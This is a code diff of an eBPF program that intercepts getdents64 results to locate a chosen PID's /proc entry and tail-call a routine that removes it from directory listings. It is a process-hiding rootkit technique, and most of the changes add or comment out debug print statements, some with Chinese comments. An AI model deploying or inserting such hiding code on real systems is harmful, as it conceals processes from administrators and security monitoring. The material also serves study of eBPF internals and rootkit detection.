@@ -60,7 +60,7 @@ const volatile int target_ppid = 0;
 // These store the string represenation
 // of the PID to hide. This becomes the name
 // of the folder in /proc/
-const volatile int pid_to_hide_len = 0;
+const volatile u32 pid_to_hide_len = 0;
 const volatile char pid_to_hide[MAX_PID_LEN] = "";
 
 // struct linux_dirent64 {
@@ -114,7 +114,7 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
 
     int total_bytes_read = ctx->ret;
 
-    my_bpf_printk("[sys_exit_getdents64] DEBUG: - PID: %d, TID: %d, total_bytes_read: %d\n", pid, tid, total_bytes_read);
+    // my_bpf_printk("[sys_exit_getdents64] DEBUG: - PID: %d, TID: %d, total_bytes_read: %d\n", pid, tid, total_bytes_read);
 
     // if bytes_read is 0, everything's been read
     if (total_bytes_read <= 0)
@@ -149,11 +149,16 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
 
     unsigned int bpos = 0;
     unsigned int *pBPOS = bpf_map_lookup_elem(&map_bytes_read, &pid_tgid);
-    my_bpf_printk("[sys_exit_getdents64] DEBUG: bpos:%d\n", bpos);
+    // my_bpf_printk("[sys_exit_getdents64] DEBUG: bpos:%d,pBPOS:%p\n", bpos, pBPOS);
     if (pBPOS != 0)
     {
         bpos = *pBPOS;
     }
+
+    my_bpf_printk("[sys_exit_getdents64] PID=%d,TID=%d,total_bytes_read=%d\n", pid, tid, total_bytes_read);
+    my_bpf_printk("[sys_exit_getdents64] pBPOS=%p,bpos=%d\n", pBPOS, bpos);
+    // my_bpf_printk("[sys_exit_getdents64] DEBUG: pid_to_hide_len:%d, pid_to_hide:%s\n", pid_to_hide_len, pid_to_hide);
+    // my_bpf_printk("[sys_exit_getdents64] DEBUG: pid_to_hide_len:%d\n", pid_to_hide_len);
 
     for (int i = 0; i < 200; i++)
     {
@@ -161,9 +166,15 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
         {
             break;
         }
+
+        my_bpf_printk("[sys_exit_getdents64] i=%d,bpos=%d\n", i, bpos);
+
         dirp = (struct linux_dirent64 *)(buff_addr + bpos);
         bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
         bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp->d_name);
+
+        my_bpf_printk("[sys_exit_getdents64] i=%d,d_reclen=%d,pid_to_hide_len=%d\n", i, d_reclen, pid_to_hide_len);
+        my_bpf_printk("[sys_exit_getdents64] i=%d,filename=%s\n", i, filename);
 
         int j = 0;
         for (j = 0; j < pid_to_hide_len; j++)
@@ -179,6 +190,7 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
             // We've found the folder!!!
             // Jump to handle_getdents_patch so we can remove it!
             // ***********
+            my_bpf_printk("[sys_exit_getdents64] i=%d,找到了目录:%s\n", i, filename);
             bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
             bpf_map_delete_elem(&map_buffs, &pid_tgid);
             bpf_tail_call(ctx, &map_prog_array, PROG_02);
@@ -187,10 +199,15 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
         bpos += d_reclen;
     }
 
+    // 如果我们尚未找到目标，但还有更多数据需要读取，
+    // 就跳回到本函数的开头，继续查找。
     // If we didn't find it, but there's still more to read,
     // jump back the start of this function and keep looking
     if (bpos < total_bytes_read)
     {
+        my_bpf_printk("[sys_exit_getdents64] 跳回到本函数的开头，继续查找 pBPOS=%p bpos=%d,total_bytes_read=%d\n", 
+            pBPOS, bpos, total_bytes_read);
+
         bpf_map_update_elem(&map_bytes_read, &pid_tgid, &bpos, BPF_ANY);
         bpf_tail_call(ctx, &map_prog_array, PROG_01);
     }
